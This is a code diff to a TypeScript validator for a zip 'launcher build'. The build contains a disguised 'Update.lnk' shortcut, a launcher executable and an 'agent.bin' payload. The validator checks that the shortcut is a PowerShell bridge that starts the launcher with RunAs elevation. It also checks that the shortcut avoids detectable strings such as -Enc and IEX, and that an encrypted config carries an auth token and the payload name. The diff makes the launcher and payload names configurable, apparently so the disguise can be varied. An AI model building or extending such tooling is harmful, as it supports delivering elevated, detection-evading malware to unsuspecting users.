@@ -26,7 +26,12 @@ export interface ValidateLauncherParams {
   prevLauncherHash: string | null;
   prevLnkHash: string | null;
   /* FIX 3: expected renameable names (defaults = confirmed working flow). */
-  names?: { updateLinkName?: string; innerFolder?: string };
+  names?: {
+    updateLinkName?: string;
+    innerFolder?: string;
+    launcherName?: string;
+    payloadName?: string;
+  };
 }
 
 export interface ValidateLauncherResult {
@@ -145,7 +150,9 @@ export async function validateLauncherBuild(
   const entries = readZipEntries(zip);
   const updateLinkName = (p.names?.updateLinkName ?? "").trim() || "Update.lnk";
   const innerFolder = (p.names?.innerFolder ?? "").trim() || "launcher";
-  const wantNames = [updateLinkName, `${innerFolder}/Launcher.exe`, `${innerFolder}/agent.bin`];
+  const launcherName = (p.names?.launcherName ?? "").trim() || "Launcher.exe";
+  const payloadName = (p.names?.payloadName ?? "").trim() || "agent.bin";
+  const wantNames = [updateLinkName, `${innerFolder}/${launcherName}`, `${innerFolder}/${payloadName}`];
   if (entries.count === wantNames.length) {
     pass("zip entry count", `exactly ${wantNames.length} entries (${entries.names.join(", ")})`);
   } else {
@@ -193,17 +200,17 @@ export async function validateLauncherBuild(
       fail("Update.lnk trigram scan", hits.join(", "));
     } else if (
       !scanHay.includes("powershell.exe") ||
-      !scanHay.includes(`${innerFolder}\\Launcher.exe`) ||
+      !scanHay.includes(`${innerFolder}\\${launcherName}`) ||
       !scanHay.includes("RunAs")
     ) {
       fail(
         "Update.lnk bridge shape",
-        `expected a powershell Start-Process bridge to .\\${innerFolder}\\Launcher.exe -Verb RunAs`
+        `expected a powershell Start-Process bridge to .\\${innerFolder}\\${launcherName} -Verb RunAs`
       );
     } else {
       pass(
         "Update.lnk bridge shape + trigram clean",
-        `fixed-system powershell -> .\\${innerFolder}\\Launcher.exe -Verb RunAs; no -Enc/IEX`
+        `fixed-system powershell -> .\\${innerFolder}\\${launcherName} -Verb RunAs; no -Enc/IEX`
       );
     }
   }
@@ -256,6 +263,12 @@ export async function validateLauncherBuild(
       pass("encrypted config carries authToken", "ciphertext-only");
     } else {
       fail("encrypted config carries authToken", "field missing after decrypt");
+    }
+    const encPayName = encodeURIComponent(payloadName);
+    if (dec.config.includes(`payName=${encPayName}`)) {
+      pass("encrypted config carries payload file name", `ciphertext-only (${payloadName})`);
+    } else {
+      fail("encrypted config carries payload file name", "field missing after decrypt");
     }
   } catch (err) {
     const message = err instanceof Error ? err.message : String(err);
